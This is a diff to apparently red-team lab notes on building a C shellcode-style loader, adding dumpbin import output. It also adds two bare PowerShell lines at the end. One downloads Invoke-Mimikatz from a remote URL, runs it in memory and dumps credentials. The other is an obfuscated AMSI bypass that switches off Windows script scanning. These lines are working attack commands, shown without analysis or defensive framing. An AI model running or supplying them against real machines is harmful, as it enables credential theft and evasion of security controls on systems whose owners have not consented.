@@ -299,3 +299,39 @@ cl /Od /Zi /Fe:local_loader.exe Local_loader_C.c
 ```
 
 After running this command, you can use tools like Dependency Walker to inspect the import table of `local_loader.exe` and verify that all the expected functions are listed.
+
+----
+
+```bash
+C:\Lab>dumpbin /imports Local_loader_C.exe
+Microsoft (R) COFF/PE Dumper Version 14.42.34436.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+
+Dump of file Local_loader_C.exe
+
+File Type: EXECUTABLE IMAGE
+
+  Section contains the following imports:
+
+    KERNEL32.dll
+             140017000 Import Address Table
+             140020EC0 Import Name Table
+                     0 time date stamp
+                     0 Index of first forwarder reference
+
+                         610 WaitForSingleObject
+                         232 GetCurrentProcess
+                         233 GetCurrentProcessId
+                         103 CreateThread
+                         5FF VirtualAlloc
+                         654 WriteProcessMemory
+                         4F5 RtlCaptureContext
+                         4FD RtlLookupFunctionEntry
+                         504 RtlVirtualUnwind
+                         ...
+```
+
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
+
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');$field.SetValue($null,$true)
